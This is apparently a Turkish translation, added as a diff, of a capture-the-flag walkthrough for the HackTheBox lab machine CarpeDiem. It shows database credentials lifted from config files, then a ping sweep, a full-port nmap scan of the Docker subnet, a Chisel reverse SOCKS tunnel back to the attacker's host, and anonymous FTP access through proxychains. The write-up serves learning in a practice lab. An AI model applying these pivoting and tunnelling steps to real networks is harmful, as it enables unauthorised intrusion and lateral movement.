@@ -669,3 +669,225 @@ book_to_rent.php  inc               plugins
 require_once('initialize.php');
 require_once('classes/DBConnection.php');
 ```
+
+==initialize.php== dev_oretnom adlı bir kullanıcı ve bazı DB bağlantı bilgileri hakkında bilgi içerir:
+
+```
+<?php
+$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
+if(!defined('base_url')) define('base_url','http://portal.carpediem.htb/');
+if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
+if(!defined('dev_data')) define('dev_data',$dev_data);
+if(!defined('DB_SERVER')) define('DB_SERVER',"mysql");
+if(!defined('DB_USERNAME')) define('DB_USERNAME',"portaldb");
+if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"J5tnqsXpyzkK4XNt");
+if(!defined('DB_NAME')) define('DB_NAME',"portal");
+?>
+```
+
+Parola olarak eklenen değer bir MD5 hash'i gibi görünür, ancak kırılmaz.
+
+DBConnection.php de aynı özelliklere sahiptir:
+
+```
+<?php
+if(!defined('DB_SERVER')){
+    require_once("../initialize.php");
+}
+class DBConnection{
+
+    private $host = 'mysql';
+    private $username = 'portaldb';
+    private $password = 'J5tnqsXpyzkK4XNt';
+    private $database = 'portal';
+    
+    public $conn;
+    
+    public function __construct(){
+
+        if (!isset($this->conn)) {
+            
+            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
+            
+            if (!$this->conn) {
+                echo 'Cannot connect to database server';
+                exit;
+            }            
+        }    
+        
+    }
+    public function __destruct(){
+        $this->conn->close();
+    }
+}
+?>
+```
+
+
+### Network Enumeration
+
+#### Ping Sweep
+
+Bu ping taraması tek satırlık komut, aynı Class-C içinde bulunan tüm hostları bir saniyeden kısa sürede döndürecektir:
+
+```
+www-data@3c371615b7aa:/$ time for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+64 bytes from 172.17.0.1: icmp_seq=0 ttl=64 time=0.068 ms
+64 bytes from 172.17.0.2: icmp_seq=0 ttl=64 time=0.045 ms
+64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.128 ms
+64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.038 ms
+64 bytes from 172.17.0.6: icmp_seq=0 ttl=64 time=0.016 ms
+64 bytes from 172.17.0.5: icmp_seq=0 ttl=64 time=0.029 ms
+
+real    0m0.477s
+user    0m0.117s
+sys     0m0.056s
+```
+
+
+Altı host var. **.1**'in konteynerleri çalıştıran host olduğunu varsayacağım ve host enumarasyonundan bu konteynerin **.6** olduğunu biliyorum. DB sunucusu **mysql** olarak ayarlanmış, bu muhtemelen bir hostname. Onu pingleyeceğim ve IP'sinin **172.17.0.3** olduğunu göreceğim.
+
+```
+www-data@3c371615b7aa:/$ ping -c 1 mysql
+PING mysql (172.17.0.3): 56 data bytes
+64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.084 ms
+--- mysql ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.084/0.084/0.084/0.000 ms
+```
+
+
+#### nmap
+
+Buradan statik olarak derlenmiş bir [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) indireceğim ve bir Python web sunucusu ve wget kullanarak konteynere yükleyeceğim. 21 saniye içinde altı hostun tamamındaki tüm portları tarıyor:
+
+```
+www-data@3c371615b7aa:/tmp$ ./nmap -p- --min-rate 10000 172.17.0.1-6
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-11-28 20:48 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.17.0.1
+Host is up (0.000090s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.17.0.2
+Host is up (0.00047s latency).
+Not shown: 65532 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+80/tcp  open  http
+443/tcp open  https
+
+Nmap scan report for mysql (172.17.0.3)
+Host is up (0.00034s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+3306/tcp  open  mysql
+33060/tcp open  unknown
+
+Nmap scan report for 172.17.0.4
+Host is up (0.00034s latency).
+Not shown: 65534 closed ports
+PORT      STATE SERVICE
+27017/tcp open  unknown
+
+Nmap scan report for 172.17.0.5
+Host is up (0.00012s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+8118/tcp open  unknown
+
+Nmap scan report for 3c371615b7aa (172.17.0.6)
+Host is up (0.00012s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 6 IP addresses (6 hosts up) scanned in 21.00 seconds
+```
+
+#### Tunnel with Chisel
+
+Bu noktada, bu ağa bir proxy almak için **[Chisel](https://github.com/jpillora/chisel)** yüklemek faydalı olabilir (ancak **CarpeDiem**'i bununla tamamlamak da mümkündür). **Python** ile barındıracağım ve ardından **wget** ile yükleyeceğim. Sonrasında ise sunucuyu sanal makinemde başlatacağım.
+
+```
+oxdf@hacky$ ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
+2022/11/28 21:04:03 server: Reverse tunnelling enabled
+2022/11/28 21:04:03 server: Fingerprint QgJndP8XXAYGo7Jf2+vSTSFH4iAa+tNYtrbWrm82J4k=
+2022/11/28 21:04:03 server: Listening on http://0.0.0.0:8000
+```
+
+Ve konteynırdan bağlanacağım:
+
+```
+www-data@3c371615b7aa:/tmp$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:socks 
+2022/11/28 21:05:25 client: Connecting to ws://10.10.14.6:8000
+2022/11/28 21:05:25 client: Connected (Latency 86.893335ms)
+```
+
+Hem proxychains'i hem de FoxyProxy'yi bu socks proxy'yi kullanacak şekilde yapılandıracağım ve artık bu subnet üzerindeki hostlarla etkileşime geçebileceğim. Örneğin, .1 “Coming Soon” sitesini gösteriyor:
+
+![Pasted image 20250108061950.png](/img/user/Pasted%20image%2020250108061950.png)
+
+
+#### 172.17.0.1 - host
+
+Tipik olarak Docker'da .1 host'tur. CarpeDiem için verilen IP'de gördüklerimle eşleşmesi de durumun böyle olduğuna dair iyi bir işaret.
+
+#### 172.17.0.2 - backdrop
+
+nmap bu hostun HTTP (80), HTTPS (443) ve FTP (21) üzerinde dinleme yaptığını gösterdi. HTTP sitesi sadece HTTPS'ye yönlendiriyor. Bu bir [Backdrop CMS](https://backdropcms.org/) örneğidir:
+
+![Pasted image 20250108062038.png](/img/user/Pasted%20image%2020250108062038.png)
+
+**backdrop.carpediem.htb** hostname'ini gösteriyor. Bunu **hosts** dosyama ekleyeceğim, ancak sanal makinemden doğrudan erişemiyorum. Giriş bilgilerine sahip değilim (yukarıdaki kimlik bilgileri çalışmıyor) ve **Backdrop CMS** için doğrulama gerektirmeyen herhangi bir açık bulamıyorum.
+
+Host üzerinde bir FTP sunucusu var ve anonim girişe izin veriyor:
+
+```
+oxdf@hacky$ proxychains ftp 172.17.0.2
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.14
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:21  ...  OK
+Connected to 172.17.0.2.
+220 (vsFTPd 3.0.3)
+Name (172.17.0.2:oxdf): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+
+Varsayılan olarak, FTP hostuma geri dönmek için başka bir bağlantı açmaya çalışacaktır, ancak bu tünel üzerinden çalışmayacaktır. Bunu önlemek için bağlantıyı pasif moda ayarlayacağım:
+
+```
+ftp> passive
+Passive mode on.
+```
+
+---
+
+**Pasif mod** ise, veri bağlantısının sunucu tarafından başlatılmadığı, bunun yerine client'in veri bağlantısını başlattığı bir ayardır. Bu şekilde, tünel üzerinden veri transferi yapmak daha kolay olur. Yani, **pasif moda almak** FTP'nin dış bağlantı açmaya çalışmasını engelleyip, her iki tarafın da bağlantıyı başlatabileceği bir ortam sağlar.
+
+---
+
+Yine de, bir dizin listesi almaya çalışmak takılıyor:
+
+```
+ftp> dir
+227 Entering Passive Mode (172,17,0,2,130,94).
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:33374  ...  OK
+150 Here comes the directory listing.
+```
+
+Neler olduğu net değil, ama takılırsam geri döneceğim.
+
+
+#### 172.17.0.3 - mysql
